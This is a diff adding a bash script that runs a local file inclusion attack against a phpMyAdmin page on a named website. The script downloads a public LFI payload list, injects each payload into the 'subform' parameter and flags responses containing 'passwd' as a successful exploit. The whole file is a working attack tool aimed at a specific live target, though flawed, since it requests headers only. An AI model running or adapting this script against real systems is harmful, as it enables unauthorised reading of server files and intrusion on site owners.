@@ -1,0 +1,57 @@
+#!/bin/bash
+
+# Target URL (replace with the actual vulnerable URL)
+TARGET_URL="https://beemediahub.com/phpmyadmin/"
+
+# Vulnerable parameter (subform in this case)
+PARAM="subform"
+
+# Payload List URL from GitHub
+PAYLOADS_URL="https://raw.githubusercontent.com/emadshanab/LFI-Payload-List/master/LFI%20payloads.txt"
+
+# Function to download the LFI payloads list
+download_payloads() {
+    echo "[*] Downloading LFI payloads list from $PAYLOADS_URL"
+    curl -s -o lfi_payloads.txt "$PAYLOADS_URL"
+}
+
+# Function to send request and print response
+send_request() {
+    local payload=$1
+    echo "[*] Sending request with payload: $payload"
+    
+    # Send the HTTP request using curl (GET method with parameter injection)
+    RESPONSE=$(curl -s -I -X GET "$TARGET_URL?$PARAM=$payload")
+
+    # Check if we got a response containing sensitive data (e.g., passwd file)
+    if echo "$RESPONSE" | grep -iq "passwd"; then
+        echo "[*] LFI Exploit Successful: Information leakage detected!"
+        echo "[*] Response:"
+        echo "$RESPONSE"
+    else
+        echo "[*] No sensitive information found with payload: $payload"
+    fi
+}
+
+# Function to test for Local File Inclusion vulnerability
+test_lfi() {
+    echo "[*] Testing LFI with payloads from LFI-Payloads.txt"
+
+    # Loop through each payload and test for LFI
+    while IFS= read -r payload; do
+        # Skip empty lines or comments
+        if [[ -z "$payload" || "$payload" == \#* ]]; then
+            continue
+        fi
+        
+        # Send request with payload
+        send_request "$payload"
+    done < lfi_payloads.txt
+}
+
+# Start Exploit Attempt
+echo "[*] Starting LFI Exploit Script..."
+download_payloads
+test_lfi
+
+echo "[*] Exploit attempts completed."
